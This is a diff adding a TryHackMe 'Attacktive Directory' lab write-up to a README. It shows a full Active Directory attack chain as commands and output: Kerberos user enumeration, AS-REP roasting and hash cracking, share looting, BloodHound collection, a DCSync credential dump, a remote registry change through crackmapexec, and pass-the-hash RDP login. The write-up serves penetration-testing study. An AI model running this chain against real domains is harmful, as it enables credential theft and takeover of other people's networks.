@@ -8,8 +8,221 @@
 ## [Reset](https://github.com/zinzloun/THM_WriteUP?tab=readme-ov-file#reset-1)
 ## [Attacktive Directory](https://github.com/zinzloun/THM_WriteUP/blob/main/README.md#attacktive-directory)
 
-
 ## Attacktive Directory
+### Enumerate AD
+
+    enum4linux-ng 10.10.215.146                                            
+	...
+	
+	 ==========================================
+	|    SMB Dialect Check on 10.10.215.146    |
+	 ==========================================
+	[*] Trying on 445/tcp
+	[+] Supported dialects and settings:
+	Supported dialects:
+	  SMB 1.0: false
+	  SMB 2.02: true
+	  SMB 2.1: true
+	  SMB 3.0: true
+	  SMB 3.1.1: true
+	Preferred dialect: SMB 3.0
+	SMB1 only: false
+	SMB signing required: true
+	...
+	 ============================================================
+	|    Domain Information via SMB session for 10.10.215.146    |
+	 ============================================================
+	[*] Enumerating via unauthenticated SMB session on 445/tcp
+	[+] Found domain information via SMB
+	NetBIOS computer name: ATTACKTIVEDIREC                                                                                                                                                                                                      
+	NetBIOS domain name: THM-AD                                                                                                                                                                                                                 
+	DNS domain: spookysec.local                                                                                                                                                                                                                 
+	FQDN: AttacktiveDirectory.spookysec.local                                                                                                                                                                                                   
+	Derived membership: domain member                                                                                                                                                                                                           
+	Derived domain: THM-AD                    
+	...
+ ### Enumerating Users via Kerberos
+
+	./kerbrute userenum --dc 10.10.215.146 -d spookysec.local spookysec_users_enum
+	
+	2024/09/05 16:37:02 >  [+] VALID USERNAME:       svc-admin@spookysec.local
+	2024/09/05 16:37:04 >  [+] VALID USERNAME:       james@spookysec.local
+	2024/09/05 16:37:06 >  [+] VALID USERNAME:       robin@spookysec.local
+	2024/09/05 16:37:10 >  [+] VALID USERNAME:       James@spookysec.local
+	2024/09/05 16:37:29 >  [+] VALID USERNAME:       darkstar@spookysec.local
+	2024/09/05 16:37:41 >  [+] VALID USERNAME:       administrator@spookysec.local
+	2024/09/05 16:38:02 >  [+] VALID USERNAME:       backup@spookysec.local
+	2024/09/05 16:38:10 >  [+] VALID USERNAME:       paradox@spookysec.local
+	2024/09/05 16:39:15 >  [+] VALID USERNAME:       JAMES@spookysec.local
+	2024/09/05 16:39:47 >  [+] VALID USERNAME:       Robin@spookysec.local
+	2024/09/05 16:42:02 >  [+] VALID USERNAME:       Administrator@spookysec.local
+	...
+
+### Abusing Kerberos
+I derived the following user's list from the previous command:
+    
+	cat ASREPRoast 
+ 
+	james@spookysec.local
+	robin@spookysec.local
+	James@spookysec.local
+	darkstar@spookysec.local
+	administrator@spookysec.local
+	backup@spookysec.local
+	paradox@spookysec.local
+	JAMES@spookysec.local
+	Robin@spookysec.local
+	Administrator@spookysec.local
+	svc-admin@spookysec.local
+
+### ASREProast
+We can try to retrieve domain users who have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. 
+It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password
+
+
+	impacket-GetNPUsers -no-pass -usersfile ASREPRoast spookysec.local/ -dc-ip 10.10.215.146 
+
+	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+	[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User JAMES@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+	$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:68647bd6f671....91ec9762
+
+Since we got a valid TGT we can try to get the password:
+	
+	hashcat svc-admin.hash pwd_list_01
+	...
+	Session..........: hashcat
+	Status...........: Cracked
+	Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+	Hash.Target......: $krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.L...ec9762
+	...
+	
+Having compromise this user we can come back to enumerate the DC:
+
+    enum4linux-ng -S -u svc-admin -p xxxxxxxxxxxxxx 10.10.215.146
+	...
+	
+	 =======================================
+	|    Shares via RPC on 10.10.215.146    |
+	 =======================================
+	[*] Enumerating shares
+	[+] Found 6 share(s):
+	ADMIN$:                                                                                                                                                                                                                            
+	  comment: Remote Admin                                                                                                                                                                                                                     
+	  type: Disk                                                                                                                                                                                                                                
+	C$:                                                                                                                                                                                                                                         
+	  comment: Default share                                                                                                                                                                                                                    
+	  type: Disk                                                                                                                                                                                                                                
+	IPC$:                                                                                                                                                                                                                                       
+	  comment: Remote IPC                                                                                                                                                                                                                       
+	  type: IPC                                                                                                                                                                                                                                 
+	NETLOGON:                                                                                                                                                                                                                                   
+	  comment: Logon server share                                                                                                                                                                                                               
+	  type: Disk                                                                                                                                                                                                                                
+	SYSVOL:                                                                                                                                                                                                                                     
+	  comment: Logon server share                                                                                                                                                                                                               
+	  type: Disk                                                                                                                                                                                                                                
+	backup:                                                                                                                                                                                                                                     
+	  comment: ''                                                                                                                                                                                                                               
+	  type: Disk                                                                                                                                                                                                                                
+	[*] Testing share ADMIN$
+	[+] Mapping: DENIED, Listing: N/A
+	[*] Testing share C$
+	[+] Mapping: DENIED, Listing: N/A
+	[*] Testing share IPC$
+	[+] Mapping: OK, Listing: NOT SUPPORTED
+	[*] Testing share NETLOGON
+	[+] Mapping: OK, Listing: OK
+	[*] Testing share SYSVOL
+	[+] Mapping: OK, Listing: OK
+	[*] Testing share backup
+	[+] Mapping: OK, Listing: OK
+
+Since we have read privilege to the backup foldere, let's see if there's any interesting content:
+
+    smbclient \\\\10.10.215.146\\backup -U spookysec.local/svc-admin
+	Password for [SPOOKYSEC.LOCAL\svc-admin]:
+	Try "help" to get a list of possible commands.
+	smb: \> ls
+	  .                                   D        0  Sat Apr  4 21:08:39 2020
+	  ..                                  D        0  Sat Apr  4 21:08:39 2020
+	  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020
+
+					8247551 blocks of size 4096. 3613829 blocks available
+	smb: \> get backup_credentials.txt 
+	getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+	smb: \> quit
+
+The file is B64 encodeded:
+
+    base64 -d backup_credentials.txt
+
+We got backup user credentials.
+
+### Enumerate AD with Bloodhound
+I was able to collect information remotely using the following:
+
+    bloodhound-python -d spookysec.local -v --zip -c All -ns 10.10.207.69 -u backup@spookysec.local -p xxxxxxxxxxxxxx
+	...
+	INFO: Compressing output into 20240906111930_bloodhound.zip
+
+Loading the file in Bloodhound (drag & drop on the central panel) and we can get useful information about the domain objects and configuration. I found that 
+backup user has GenericAll privileges to DC ATTACKTIVEDIRECTORY.SPOOKYSEC.LOCAL, could be a path of exploitation: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution, but it seems quite complicated to me, so I decided to move forward. 
+
+Bloodhound revealed that backup user is allowed to RDP to the DC, then I proceeded in this way.
+
+### Investigate backup user
+
+The user does not seems to have particular privileges on the machine, is only a Domain Users member.
+We can open AD users & computers snap-in to perform futher inspections. I suggest to enable Advantage features in the View menu.
+Here we can see that the user has the followin privileges on the domain:
+
+![sp](./img/spookysec.png)
+
+### DcSync attack
+These privileges allows us to perform a DCSync attack. More information here: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
+	
+	impacket-secretsdump spookysec.local/backup:xxxxxxxxxxxxxx@10.10.60.250 -just-dc-ntlm
+	...
+	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+	[*] Using the DRSUAPI method to get NTDS.DIT secrets
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxx:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	...
+I tried to reverse the NTLM hash but with no luck:
+	
+	hashcat admin.spooky /usr/share/wordlists/rockyou.txt
+	...
+	Session..........: hashcat                                
+	Status...........: Exhausted
+	Hash.Mode........: 1000 (NTLM)
+	Hash.Target......: xxxxxxxxxxxxxxxxxxxxxxxxxx
+	....
+
+Then I tried to use xfreerdp with PTH but <b>Restricted Admin Mode</b> prevented me from signing in, with NTLM hash.
+Using crackmapexec we can eventually try to disable the restriction, changing the related register value:
+	
+	crackmapexec smb 10.10.60.250 -u "spookysec.local/administrator" -H "xxxxxxxxxxxxxxxxxxxxxxxxxx" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+
+	SMB         10.10.60.250    445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
+	SMB         10.10.60.250    445    ATTACKTIVEDIREC  [+] spookysec.local\administrator:xxxxxxxxxxxxxxxxxxxxxxxxxx (Pwn3d!)
+	SMB         10.10.60.250    445    ATTACKTIVEDIREC  [+] Executed command 
+	SMB         10.10.60.250    445    ATTACKTIVEDIREC  The operation completed successfully.
+
+Finally we can login with RDP
+	
+	xfreerdp /u:administrator /d:spookysec.local /pth:xxxxxxxxxxxxxxxxxxxxxxxxxx /v:10.10.60.250
+
+
 
 ## Borderlands
 
